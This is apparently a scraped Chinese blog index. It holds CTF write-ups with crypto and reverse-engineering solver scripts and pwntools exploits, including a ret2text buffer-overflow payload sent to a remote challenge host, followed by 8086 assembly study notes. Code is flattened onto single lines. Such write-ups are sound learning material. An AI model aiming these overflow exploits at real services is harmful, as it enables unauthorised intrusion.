512)_rand_int = functools.partial(random.SystemRandom().randint, 0)class Encryptor(): def __init__(self): self.pubKey = None self.priKey = None def __gen_prime__(self, rs, n_bits): p = gy.mpz_urandomb(rs, n_bits) while not gy.is_prime(p): p += 1 return p def __key_gen__(self, n_bits=512): while True: rs = gy.random_state(datetime.now().microsecond) p = self.__gen_prime__(rs, n_bits) q = self.__gen_prime__(rs, n_bits) n = p * q lmd = (p - 1) * (q - 1) if gy.gcd(n, lmd) == 1: break g = n + 1 mu = gy.invert(lmd, n) self.pubKey = [n, g] self.priKey = [lmd, mu] return (self.pubKey, self.priKey) def encipher(self, plaintext): m = plaintext n, g = self.pubKey r = gy.mpz_random(gy.random_state(datetime.now().microsecond), n) while gy.gcd(n, r) != 1: r += 1 ciphertext = gy.powmod(g, m, n ** 2) * gy.powmod(r, n, n ** 2) % (n ** 2) return ciphertextclass Commit: def __init__(self): self.param = None def __key_gen__(self, n): p = n r = 1 while True: q = r * p + 1 if gy.is_prime(q): break r += 1 x = q - 1 while True: g = x ** r % q if g != 1: break x -= 1 while True: h = x ** r % q if(g != h and h != 1): break x -= 1 self.param = q, g, h def commit(self, m): q, g, h = self.param r = number.getRandomRange(1, q - 1) c = (pow(g, m, q) * pow(h, r, q)) % q return c, rdef shuffle(X, Y, x): res = [] for i in range(len(X)): res.append([i, X[i], Y[i]]) for j in range(x): res.append([i, X[i] + random.randint(-X[i], X[i]), Y[i] + random.randint(-Y[i], Y[i])]) random.shuffle(res) return resdef main(): k = 6 sk = [] flag = os.environ[&quot;flag for GFCTF2022-Crypto Recover Secret&quot;] secret = libnum.s2n(flag) assert len(bin(secret)) &lt; 514 enc = Encryptor() sk = [enc.__key_gen__() for i in range(k)] print(sk) s = [_rand_int(_N - 1) for i in range(k)] s[0] = secret v = Commit() v.__key_gen__(_N) print(v.param) cr = [v.commit(s[i]) for i in range(k)] c = [i[0] for i in cr] print(c) X = [] Y = [] for i in range(1, k + 1): xs = 1 enc.pubKey = sk[i - 1][0] n_2q = enc.pubKey[0] ** 2 for j in range(k): xs *= pow(enc.encipher(i ** j), cr[j][1], n_2q) X.append(xs) ys = 1 for j in range(k): ys *= pow(enc.encipher(i ** j), s[j], n_2q) Y.append(ys) X_Y = shuffle(X, Y, 51) print(X_Y)if __name__ == '__main__': main() Proof YourselfDASCTF NOV XNewStarCTFCryptounusual_base简单的变异base64 123456789101112131415from Crypto.Util.number import long_to_bytesdef base64_decode(string): table='c5PKAQmgI&amp;qSdyDZYCbOV2seXGloLwtFW3f9n7j481UMHBp6vNETRJa$rxuz0hik' result='' for i in string: print(i) if i!='%': index=table.index(i) result+=(bin(index)[2:]).zfill(6) elif i=='%': result=result[:-4] return long_to_bytes(int(result,2))encoded = &quot;GjN3G$B3de58ym&amp;7wQh9dgVNGQhfG2hndsGjlOyEdaxRFY%&quot;print(base64_decode(encoded)) Affine12345678910111213import gmpy2cip=b&quot;\\xb1\\x83\\x82T\\x10\\x80\\xc9O\\x84\\xc9&lt;\\x0f\\xf2\\x82\\x9a\\xc9\\x9b8'\\x9b&lt;\\xdb\\x9b\\x9b\\x82\\xc8\\xe0V&quot;for a in range(256): for b in range(256): if (ord('f')*a+b)%256==cip[0] and (ord('l')*a+b)%256==cip[1] and (ord('a')*a+b)%256==cip[2]: print(a,b)a,b=163,191flag=''for i in cip: flag+=chr((i-b)*gmpy2.invert(a,256)%256)print(flag) ezPRNG1234567891011121314151617import gmpy2from Crypto.Util.number import long_to_bytesgift=[32579077549265101609729134002322479188058664203229584246639330306875565342934, 30627296760863751873213598737521260410801961411772904859782399797798775242121, 59045755507520598673072877669036271379314362490837080079400207813316110037822, 29714794521560972198312794885289362350476307292503308718904661896314434077717, 3378007627369454232183998646610752441039379051735310926898417029172995488622, 35893579613746468714922176435597562302206699188445795487657524606666534642489]t1=gift[5]-gift[4]t2=gift[4]-gift[3]t3=gift[3]-gift[2]t4=gift[2]-gift[1]t5=gift[1]-gift[0]t11=(t2*t2-t1*t3)t22=(t3*t3-t2*t4)t33=(t4*t4-t3*t5)c=gmpy2.gcd(gmpy2.gcd(t11,t22),t33)c=c//2a=t1*gmpy2.invert(t2,c)%cb=(gift[1]-a*gift[0])%cflag=(gift[0]-b)*gmpy2.invert(a,c)%cprint(long_to_bytes(flag)) ezRabin求二次剩余后用中国剩余定理即可 1234567891011121314151617from Crypto.Util.number import *import gmpy2print('start')c= 59087040011818617875466940950576089096932769518087477304162753047334728508009365510335057824251636964132317478310267427589970177277870220660958570994888152191522928881774614096675980017700457666192609573774572571582962861504174396725705862549311100229145101667835438230371282904888448863223898642183925834109p= 10522889477508921233145726452630168129218487981917965097647277937267556441871668611904567713868254050044587941828674788953975031679913879970887998582514571q= 11287822338267163056031463255265099337492571870189068887689824393221951058498526362126606231275830844407608185240702408947800715624427717739233431252556379e = 4R.&lt;x&gt; = Zmod(p)[] #将x作为需要求得的未知数，p为素数f = x^e-cr1 = [int(i[0]) for i in f.roots()] #f.roots()返回求解出来的所有解的列表R.&lt;x&gt; = Zmod(q)[]f = x^e-cr2 = [int(i[0]) for i in f.roots()]m = []for i in r1: for j in r2: print(long_to_bytes(crt([i,j],[p,q])&gt;&gt;300)) #crt求解中国剩余定理，第一个参数为余数列表，第二个参数为模数列表 Reverse艾克体悟题在Com文件夹下发现FlagActivity 阅读逻辑，可以发现需要按10000次按钮才能获得Flag，那就按吧 安装软件，通过以下命令启动该活动 1adb shell am start -n com.droidlearn.activity_travel/.FlagActivity 然后点1w次 前可见古人，后可见来者简单的加密 注意有TLS回调 1234567891011121314151617cip =[ 0x51, 0x5B, 0x4C, 0x56, 0x59, 0x4D, 0x50, 0x56, 0x54, 0x43, 0x7D, 0x4C, 0x43, 0x53, 0x7D, 0x50, 0x43, 0x53, 0x7D, 0x47, 0x50, 0x7D, 0x4C, 0x43, 0x53, 0x7D, 0x4E, 0x40, 0x4A, 0x5F, 0x00]flag=''for i in cip: i^=0x22 if i&gt;65 or i&lt;90: if i&gt;=97 and i&lt;=122: flag+=chr(97+(i-97-13)%26) else: flag+=chr(i) else: flag+=chr(65+(i-65-13)%26)print(flag) FindME第一段： 第二段 第三段 最后验证 12345678910111213141516cip=[0x67617FF4,0x6E305341,0x656C4DE0,0x69744BEC,0x625F7460,0x6F7348F4,0x656871C9,0x7D216ED3]for i in range(len(cip)): cip[i]^=cip[i]&gt;&gt;17for i in range(len(cip)): cip[i]^=0x2022flag=''for i in range(len(cip)): flag+=chr((cip[i])&amp;0xff)+chr((cip[i]&gt;&gt;8)&amp;0xff)+chr((cip[i]&gt;&gt;16)&amp;0xff)+chr(cip[i]&gt;&gt;24)print(flag) 其实也可以angr 1234567891011121314151617181920212223242526272829303132import angrimport sysdef main(argv): path_to_binary = 'task_time' # :string project = angr.Project(path_to_binary) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state,veritesting = True) def is_good(state): return b'You Gift' in state.posix.dumps(1) # state.posix.dumps(1)代表輸出，若輸出中包含'Well done! You find the secret!'即代表是我的目的地 def is_bad(state): return b'Wait' in state.posix.dumps(1) # state.posix.dumps(1)代表輸出，若輸出中包含'The flag is wrong! Maybe something run before main'即代表要避開的地方 simulation.explore(find=is_good,avoid=is_bad) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 注意开启veritesting避免路径爆炸 WebPwnret2text123456from pwn import *# p=process('./pwn')p=remote('node4.buuoj.cn', '27726')payload=b'a'*0x28+p64(0x400708)p.sendlineafter(b'name?',payload)p.interactive() calc1234567891011121314151617181920212223from pwn import *import refrom Cryptodome.Util.number import long_to_bytes# p=process('./pwn')p=remote('node4.buuoj.cn', '26255')p.recvuntil(b'Enjoy it!\\n')for i in range(100): inf=p.recvline().decode() print(inf) num=re.findall('[0-9]+',inf) if '+' in inf: p.sendline(str(int(num[0])+int(num[1])).encode()) elif '-' in inf: p.sendline(str(int(num[0])-int(num[1])).encode()) elif 'x' in inf: p.sendline(str(int(num[0])*int(num[1])).encode()) elif '/' in inf: p.sendline(str(int(num[0])//int(num[1])).encode()) else: print(i) print(p.recvline())p.interactive() ret2libcret2shellcodefallw1nd’s gift","link":"/2023/01/09/%E5%A4%8D%E5%81%A5%E8%AE%AD%E7%BB%83/"},{"title":"汇编语言(10) 内中断","text":"第十二章 内中断中断：CPU不再接着（刚执行完的指令）向下执行，而是转去处理这个特殊消息 中断信息可以来自CPU的内部和外部，此处主要讨论来自CPU内部的中断信息 12.1 内中断的产生对于8086CPU，当CPU内部有下面的情况发生时，将产生相应的中断信息 除法错误，如执行diiv指令产生的除法溢出 (0) 单步执行 (1) 执行into指令 (4) 执行int指令 (int n) 中断类型码：字节型数据，用于标识中断信息的来源，可表示256种 12.2 中断处理程序如何根据8位的中断类型码得到中断处理程序的段地址和偏移地址？ 12.3 中断向量表中断处理程序的入口地址的列表 CPU如何找到中断向量表对8086PC机，中断向量表指定放在内存地址0处。从内存0000:0000到000:03FF的1024个单元存放着中断向量表。 在中断向量表中，一个表项存放一个中断向量，即一个中断处理程序的入口地址。所以一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。 12.4 中断过程下面是8086CPU在收到中断信息后，所引发的终端过程 （从中断信息中）取得中断类型码 标志寄存器的值入栈 设置标志寄存器的第8位TF和第9位IF的值为0 CS的内容入栈 IP的内容入栈 从内存地址为中断类型码*4 和中断类型码*4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS 12.5 中断处理程序和iret指令 iret指令通常和硬件自动完成的中断过程配合使用，其功能描述如下： 123pop IPpop CSpopf 12.6 除法错误中断的处理0号中断处理程序(除法错误中断)的功能：显示提示信心”Divide overflow”后，返回操作系统 12.7 编程处理0号中断主要要做以下几件事： 编写可以显示”overflow!”的中断处理程序：do0 将do0送入内存0000:0200处 (此处内存一般为空) 将do0的入口地址0000:0200存储在中断向量表0号表项中 程序框架： 1234567891011assume cs:codecode segmentstart: do0安装程序 设置中断向量表 mov ax,4c00h int 21hdo0: 显示字符串&quot;overflow!&quot; mov ax,4c00h int 21hcode endsend start 12.8 安装 12.9 do0 注意：将”overflow!”放到do0程序中，若是将字符串放到主程序的data段，在主程序执行完后由于内存空间被系统回收，使得字符串容易被其他内容覆盖。另外，由于do0程序开始处”overflow!”不是可以执行的代码，所以在”overflow”前加上一条jmp指令，转移到正式的do0程序。 12.10 设置中断向量 12.11 单步中断CPU在执行完一条指令后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程。单步中断的中断类型码为1，它所引发的中断过程如下： 取得中断类型码1 标志寄存器入栈，TF、IF设置为0 CS、IP入栈 (IP)=(14)，(CS)=(1\\4+2) 单步中断为单步跟踪程序的执行过程提供了实现机制 12.12 响应中断的特殊情况有些情况下，CPU在执行完当前指令后，即便是发生中断，也不会响应","link":"/2022/04/06/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-10-%E5%86%85%E4%B8%AD%E6%96%AD/"},{"title":"汇编语言 14 端口","text":"14.1 端口的读写端口地址的的范围：0~65535 端口的读写指令只有两条：in和out 1int al,60h ;从60h号端口读入一个字节 注意，在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口的数据。访问8位端口时用al，访问16位端口时用ax 14.2 CMOS RAM芯片14.3 shl和shr指令shl是逻辑左移指令，它的功能为 将一个寄存器或内存单元中的数据向左移位 将最后移出的一位写入CF中 最低位用0补充 如果移动位数大于1时，必须将移动位数放在cl中 shr是逻辑右移指令，它和shl所进行的操作刚好相反 将一个寄存器或内存单元中的数据向右移位 将最后移出的一位写入CF中 最高位用0补充 如果移动位数大于1时，必须将移动位数放在cl中 14.4 CMOS RAM中存储的时间信息","link":"/2022/04/23/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-12-%E7%AB%AF%E5%8F%A3/"},{"title":"汇编语言 11 int指令","text":"第十三章 int指令该章主要讲解int指令引发的中断 13.1 int指令1int n;n为中断类型码，功能是引发中断过程 执行过程： 取中断类型码n 标志寄存器入栈，IF=0，TF=0 CS、IP入栈 (IP)=(N4)，(CS)=(n\\4+2) 从此处转去执行n号中断的中断处理程序 13.2 编写供应用程序调用的中断例程 在中断例程sqr的最后，要使用iret指令，其功能为 123pop IPpop CSpopf 13.3 对int、iret和栈的深入理解13.4 BIOS和DOS所提供的中断例程BIOS（基本输入输出系统），主要包含以下几部分内容： 硬件系统的检测和初始化程序 外部中断和内部中断的中断例程 用于对硬件设备进行I/O操作的中断例程 其他和硬件系统相关的中断例程 操作系统DOS也提供了中断例程，从操作系统的角度来看，DOS的中断例程就是操作系统向程序员提供的编程资源 13.5 BIOS和DOS中断例程的安装过程BIOS和DOS所提供的中断例程如何安装到内存中 13.6 BIOS中断例程应用一般来说，一个供程序员调用的中断例程中往往包括多个子程序，中断例程内部用传递进来的参数来决定执行哪一个子程序。BIOS和DOS提供的中断例程，都用ah来传递内部子程序的编号。 13.7 DOS中断例程应用我们前面一直使用的是int 21h中断例程的4ch号功能，即程序返回功能： 1234567mov ah,4ch ;程序返回mov al,0 ;返回值int 21h;常写为mov ax,4c00hint 21h int 21h中断例程在光标位置显示字符串的功能： 123ds:dx 指向字符串 ;要显示的字符串需要用&quot;$&quot;作为结束符mov ah,9 ;功能号9，表示在光标位置显示字符串int 21h","link":"/2022/04/22/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-11-int%E6%8C%87%E4%BB%A4/"},{"title":"汇编语言(2) 第一个程序","text":"还是只想摸鱼 4.1 一个源程序从写出到执行的过程 编写汇编源程序 对源程序进行编译链接 执行可执行文件中的程序 4.2 源程序12345678910111213assume cs:codesgcodesg segment mov ax,0123H mov bx,0456H add ax,bx add ax,ax mov ax,4c00H int 21Hcodesg endsend 1、伪指令汇编语言源程序中，包含两种指令，一种是汇编指令，一种是伪指令。 伪指令没有对应的机器指令，最终不被CPU执行，而是由编译器执行来进行相关的编译工作。 XXX segment … XXX ends segment和ends是一对成对使用的伪指令，其功能为定义一个段，一个段还必须有一个名称来标识 end end是一个汇编程序的结束标记。编译器在编译汇编程序过程中，若碰到伪指令end，则结束对源程序的编译。 （注意区分end和ends） assume assume假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。 2、程序返回一个程序结束后，需要将CPU的控制权返还给使它运行的程序。 相关指令： 12mov ax,4c00Hint 21H 4.3 编辑源程序4.4 编译通过运行masm编译.asm文件生成.obj文件 4.5 连接运行line.exe，将上一步生成的.obj文件进行连接，生成可执行的.exe文件 连接的作用： Summary DOS系统中.EXE文件中程序的加载过程","link":"/2022/01/28/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-2-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/"},{"title":"汇编语言(4) 包含多个段的程序","text":"好久没学习，一直在摸鱼，罪过罪过 6.1 在代码段中使用数据在程序中直接存放数据时，数据会被转译为指令，此时需要使用”start”和”end start”指明程序执行的入口，如 在编译、连接后，由”end start“指明的程序入口，被转化为一个入口地址，存储在可执行文件的描述信息中。 6.2 在代码段中使用栈6.3 将数据、代码、栈放入不同的段 定义多个段的方法：与此前定义代码段的方法无区别 对段地址的引用：在程序中，段名代表了段地址，因此指令“mov ax,data”的含义就是将名称为data的段的段地址送入ax “代码段”、“数据段”、“栈段”完全是我们的安排 仅是便于阅读，CPU并不知道他们，并不是说将某个段定义为“代码段”CPU就会自动执行它 即使使用以下伪指令将cs、ds和ss分别与code、data、stack段相连，CPU也不会自动将cs指向code，ds指向data，ss指向stack 1assume cs:code,ds:data,ss:stack CPU如何知道程序入口？在源程序的最后用“end start”说明了程序的入口，这个入口将被写入可执行文件的描述信息，可执行文件中的程序被加载入内存后，CPU的CS:IP将被设置指向这个入口。","link":"/2022/02/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-4-%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/"},{"title":"汇编语言(5) 更灵活的定位内存地址的方法","text":"7.1 and 和 or 指令and 指令：逻辑与指令，按位进行与运算例如： 123mov al,01100011Band a1,00111011B;a1=00100011B or 指令：逻辑或指令，按位进行或运算例如： 123mov al,01100011Bor al,00111011B;al=01111011B 7.2 ASCII码略 7.3 以字符形式给出的数据在汇编程序中，可以用‘…’的方式指明数据是以字符的形式给出，编译器将自动将其转化为ASCII码 例如： 1db 'unIX' ;相当于 &quot;db 75H,6EH,49H,58H&quot; 7.4 大小写转换的问题观察大小写字符的规律，发现一个字母不管大小写，只用将其第五位置0，它就必为大写字母，置1则变为小写字母 因此通过or和and指令即可以转换大小写字母 12and al,11011111B ;将第五位置0，转变为大写字母or al,00100000B ;将第五位置1，变为小写字母 7.5 [bx+idata]可用以下方式更灵活的指明一个内存单元 12345mov ax,[bx+200] ;主要; 以下方式也可以mov ax,[200+bx]mov ax,200[bx]mov ax,[bx].200 7.6 用[bx+idata]的方式进行数组的处理 7.7 SI和DIsi和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用 123456789mov bx,[0]mov ax,[bx+123];mov si,0mov ax,[si+123];mov di,0mov ax,[di+123];以上三组指令实现了相同的功能 7.8 [bx+si]和[bx+di]可以使用[bx+si]和[bx+di]的方式来指明一个内存单元，其偏移地址为(bx)+(si)/(di) (即bx中的数值加上si/di中的数值)，如 1mov ax,[bx+si] 该指令也可写成如下格式： 1mov ax,[bx][si] 7.9 [bx+si+idata]和[bx+di+idata]1mov ax,[bx+si+idata] (ax)=((ds)*16+(bx)+(si)+idata)，将偏移地址为bx中的数值+si中的数值+idata的字送入ax 也可写成如下数值 123mov ax,200[bx][si]mov ax,[bx].200[si]mov ax,[bx][si].200 7.10 不同的寻址方式的灵活应用二重循环的处理如以下程序，存在一定的问题： 123456789101112131415mov ax,datasgmov ds,axmov bx,0mov cx,4s0: mov si,0 mov cx,3s: mov al,[bx+si] and al,11011111b mov [bx+si],al inc si loop s add bx,16 loop s0 进行了二重循环，却只用了一个循环计数器，造成在进行内层循环的时候，覆盖了外层循环的循环计数器。 实验六：编程，将datasg段中每个单词的前4个字母改为大写字母 123456789101112131415161718192021222324252627282930313233343536373839404142ASSUME CS:codesg, DS:datasg, SS:stacksgstacksg segment dw 0,0,0,0,0,0,0,0stacksg endsdatasg segment db '1. display ' db '2. brows ' db '3. replace ' db '4. modify 'datasg endscodesg segment start: mov ax,stacksg mov ss,ax mov sp,16 mov ax,datasg mov ds,ax mov cx,4 mov bx,0 mov si,0 s: push cx mov cx,4 mov si,0 s1: mov al,ds:[bx+3+si] and al,11011111B mov ds:[bx+3+si],al inc si loop s1 pop cx add bx,16 loop s mov ax,4c00h int 21hcodesg endsend start","link":"/2022/02/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-5-%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"汇编语言(6) 数据处理的两个基本问题","text":"定义描述性符号：reg和sreg: reg：表示一个寄存器，包括ax、bx、bx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di sreg：表示一个段寄存器，包括ds、ss、cs、es 8.1 bx、si、di和bp 在8086CPU中，只有这四个寄存器可以在“[…]”中进行内存单元的寻址。如 12mov ax,[bp+si] ;正确mov ax,[cx] ;错误 在[…]中，这4个寄存器可以单个出现，或只能以四种组合出现bx和si、bx和di、bp和si、bp和di 1234mov ax,[bx+si]mov ax,[bp+di] ;正确mov ax,[bx+bp]mov ax,[si+di] ;错误 只要在[…]中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中 8.2 机器指令处理的数据在什么地方8.3 汇编语言中数据位置的表达三个概念来表达数据的位置 立即数。在汇编指令中直接给出，执行前在CPU的指令缓冲器中 寄存器。指令要处理的数据在寄存器中。 段地址(SA)和偏移地址(EA)。指令要处理的数据在内存中。 8.4 寻址方式 8.5 指令要处理的数据有多长8086CPU的指令可以处理两种尺寸的数据：byte和word，因此要在机器指令中指明长度。 通过寄存器名指明要处理的数据尺寸。 12mov ax,1 ;指明进行子操作mov al,1 ;指明进行字节操作 在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte 12mov word ptr ds:[0],1;指明访问的内存单元为字单元mov byte ptr ds:[0]:1;指明访问的内存单元为字节单元 其它方法。有些指令默认访问的是字单元还是字节单元。如Push指令只进行字操作。 8.6 寻址方式的综合应用8.7 div指令div是除法指令，使用div做除法时应注意以下问题： 除数：有8位和16位两种，在一个reg或内存单元中 被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位 结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数 利用除法指令计算100001/100：除数100小于255，可以在一个8位寄存器中存放，但由于被除数是32位的，除数应为16位，所以用一个16位寄存器来存放除数100 1234mov dx,1mov ax,86a1h ;(dx)*10000h+(ax)=100001mov bx,100div bx 8.8 伪指令dd前面用db和dw定义字节型数据和字型数据。dd是用来定义dword(double word)型数据的。 8.9 dup与db、dw、dd等数据定义伪指令配合使用，用来进行数据的重复，如： 123db 3 dup (0) ;定义三个字节，它们的值都是0db 3 dup (0,1,2) ;定义了9个字节，它们是0、1、2、0、1、2、0、1、2db 3 dup ('abc','ABC') ;定义了18个字节，它们是'abcABCabcABCabcABC 可见，dup的使用格式如下： 实验七 寻址方式在结构化数据访问中的应用题目：（data段在代码中） code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081assume cs:codesgdata segment db '1975','1976','1977','1978','1979','1980','1981','1982','1983' db '1984','1985','1986','1987','1988','1989','1990','1991','1992' db '1993','1994','1995';4*21=84bytes dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 ;0x10h,0x16h,0x17eh dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5927000;4*21=84bytes dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800data endstable segment db 21 dup ('year summ ne ?? ')table endscodesg segment start: mov ax,data mov ds,ax mov ax,table mov ss,ax;放入年份 mov bx,0 mov si,0 mov cx,21 ;由于存在两重循环，使用dx记录cx的值 mov bp,0 s1: mov dx,cx mov cx,4 s2: mov al,ds:[bp+si] mov ss:[bx+si],al inc si loop s2 add bx,16 add bp,4 mov si,0 mov cx,dx loop s1;放入收入 mov cx,21 mov bx,0 mov di,7 mov si,0 s3: mov ax,ds:[si+86] ;收入 mov ss:[bx+di],ax mov ax,ds:[si-2+86] mov ss:[bx+di-2],ax add bx,16 add si,4 loop s3;放入雇员数 mov cx,21 mov si,0 mov bx,0 s4: mov ax,ds:[si+168] ;雇员数 mov ss:[bx+10],ax add si,2 add bx,16 loop s4;计算人均收入，并将结果存入表中;32位除16位，AX存储除法操作的商 mov cx,21 mov bp,0 s5: mov dx,ss:[bp+7] mov ax,ss:[bp+5] mov bx,ss:[bp+10] div bx mov ss:[bp+13],ax add bp,16 loop s5 mov ax,4c00h int 21hcodesg endsend start （感觉寄存器要不够用了-.-!） 结果截图：","link":"/2022/02/25/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-6-%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/"},{"title":"汇编语言 七 转移指令的原理","text":"9.0 转移指令可以修改IP，或同时修改CS和IP的指令统称为转移指令。概括来讲，转移指令就是可以控制CPU执行内存某处代码的指令 8086CPU的转移行为有以下几类： 只修改IP时，称为段内转移，比如：jmp ax 同时修改CS和IP时，称为段间转移，比如：jmp 1000:0 由对IP的修改范围不同，段内转移分为：短转移和近转移 短转移IP修改范围：-128~127 近转移IP修改范围：-32768~32767 8086CPU转移指令分为以下几类： 无条件转移指令（jmp） 条件转移指令 循环指令（loop） 过程 中断 9.1 操作符offset操作符offset：取得标号的偏移地址，如 9.2 jmp指令jmp为无条件转移指令，可以只修改ip，也可以同时修改cs和ip 9.3 依据位移进行转移的jmp指令段内短转移： 1jmp short 标号 ;转到标号处执行指令 对ip修改范围为-128~127 对应jmp的机器码，可以发现CPU在执行jmp指令的时候并不需要转移的目的地址，包含的是转移的位移，该位移是编译器根据汇编指令的“标号”计算出来的，具体计算方法如图 实际上，“jmp short 标号”的功能为：(IP)=(IP)+8位位移： 8位位移=标号处地址-jmp指令后的第一个字节的地址 short指明此处位移为8位位移 8位位移范围为-128~127，用补码表示 8位位移由编译程序在编译时算出 与“jmp short 标号“相近的指令：”jmp near ptr 标号”，其实现的是段内近转移(-32768~32767) 9.4 转移的目的地址在指令中的jmp指令1jmp far ptr 标号 实现的是段间转移，又称为远转移，far ptr 指明了指令用标号的段地址和偏移地址修改CS和IP 9.5 转移地址在寄存器中的jmp指令指令格式： 1jmp 16位reg ;功能：(IP)=(16位reg) 9.6 转移地址在内存中的jmp指令两种格式： 1jmp word ptr 内存单元地址 ;（段内转移） 功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出，比如 123mov ax,0123Hmov ds:[0],axjmp word ptr ds:[0] 第二种： 1jmp dword ptr 内存单元地址 ;(段间转移) 功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址，如： 12345mov ax,0123hmov ds:[0],axmov word ptr ds:[2],0jmp dword ptr ds:[0];执行后，(CS)=0,(IP)=0123H 9.7 jcxz指令jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码种包含转移的位移，而不是目的地址，对IP修改范围都为-128~127。 指令格式： 1jcxz 标号 ;若(cx)=0，则转移到标号出执行 当(cx)!=0时，什么也不做，程序继续向下执行 9.8 loop指令loop指令为循环指令，所有的循环指令都是短位移，IP修改范围为：-128~127 指令格式：loop 标号((cx)=(cx)-1，如果(cx)!=0，转移到标号处执行) 9.9 根据位移进行转移的意义意义：方便了程序段在内存中的浮动装配 9.10 编译器对转移位移超界的检测如果在源程序中出现了转移范围超界的问题，在编译的时候，编译器将报错 实验九 在缓冲区显示彩色字符1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859assume cs:codesg; 绿色：00000010=02H 绿底红色：00100100=24H 白底蓝色01110001=71H; welcome to masm! len=16; 11-13行：0x6e0~0x780~0x820data segment db 'welcome to masm!'data endscodesg segment start: mov ax,data mov ds,ax mov ax,0b800h mov ss,ax ;显示绿色字符串 mov bx,06e0h mov si,70 mov di,0 mov cx,16 s: mov al,ds:[di] mov ss:[bx+si],al add si,1 mov al,02H mov ss:[bx+si],al add si,1 inc di loop s ;显示绿地红色 mov bx,0780h mov si,70 mov di,0 mov cx,16 s1: mov al,ds:[di] mov ss:[bx+si],al add si,1 mov al,24H mov ss:[bx+si],al add si,1 inc di loop s1 ;显示白底蓝色 mov bx,0820h mov si,70 mov di,0 mov cx,16 s2: mov al,ds:[di] mov ss:[bx+si],al add si,1 mov al,71H mov ss:[bx+si],al add si,1 inc di loop s2 mov ax,4c00h int 21hcodesg endsend start","link":"/2022/03/02/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-7-%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/"},{"title":"汇编语言(9) 标志寄存器","text":"第十一章 标志寄存器11.0 标志寄存器 8086CPU内部有一种特殊的寄存器，称为标志寄存器（简称为flag），flag寄存器与其他寄存器不一样，其他寄存器用于存放数据，整个寄存器具有一个含义，而flag寄存器按位起作用，每一位用于记录特定的信息。 11.1 ZF标志flag的第6位是ZF，零标志位(Zero Flag?)。它记录相关指令执行后，其结果是否为0，若结果为0，ZF=1；若结果不为0，ZF=0。例如 12mov ax,1sub ax,1 ;ZF=1 大部分运算指令(add、sub…)的执行影响标志寄存器，大部分传送指令(mov、push…)不影响标志寄存器。 11.2 PF标志flag的第2位是PF，奇偶标志位(parity flag)。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。若1的个数为偶数，pf=1，如果为奇数，那么pf=0。例如 123mov al,1add al,10;result=00001011B,pf=0 11.3 SF标志flag的第七位是SF，符号标志位(symbol flag)。它记录相关指令执行后，其结果是否为负。如果结果为负，sf=1；如果非负，sf=0。 SF标志就是CPU对有符号数运算结果的一种记录，它记录数据的正负。在我们将数据当作有符号数来运算时，可以通过它来得知结果的正负。如果我们将数据当作无符号数来运算，SF的值则没有意义，虽然相关指令影响了它的值。 11.4 CF标志flag的第0位是CF，进位标志位(carry flag)。一般情况下，它记录了运算结果的最高有效位向更高位的进位值，或向更高位的借位值。 例如： 123mov al,98Hadd al,al ;执行后 (al)=30H,CF=1,CF记录了从最高有效位到更高位的进位值add al,al ;执行后 (al)=60H,CF=0 11.5 OF标志flag的第11位是OF，溢出标志位(Overflow Flag)。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生了溢出，OF=1；如果没有，OF=0。 CF和OF区别：CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位 123mov al,0F0Hadd al,78H;指令执行后，CF=1,OF=0 11.6 adc指令adc是带进位加法指令，它利用了CF位上记录的进位值 12指令格式：adc 操作对象1, 操作对象2功能：操作对象1=操作对象1+操作对象2+CF 例： 1234mov ax,2mov bx,1sub bx,axadc ax,1 